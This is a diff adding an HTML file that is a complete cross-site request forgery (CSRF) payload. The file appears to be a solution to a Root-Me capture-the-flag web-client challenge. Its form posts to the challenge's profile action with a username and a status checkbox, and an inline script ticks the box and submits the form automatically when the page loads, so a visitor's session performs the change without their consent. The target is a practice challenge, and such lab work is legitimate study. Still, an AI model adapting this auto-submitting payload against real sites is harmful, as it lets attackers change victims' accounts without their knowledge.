@@ -1,0 +1,19 @@
+<form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data" name="csrf_form">
+        <div class="form-group">
+                <label>Username:</label>
+                <input type="text" name="username" value="kyto">
+        </div>
+        <br>               
+        <div class="form-group">
+                <label>Status:</label>
+                <input type="checkbox" name="status">
+        </div>
+        <br>       
+        <button type="submit">Submit</button>
+</form>
+
+<script>
+        document.csrf_form.status.checked = true;
+        document.csrf_form.submit();
+</script>
+
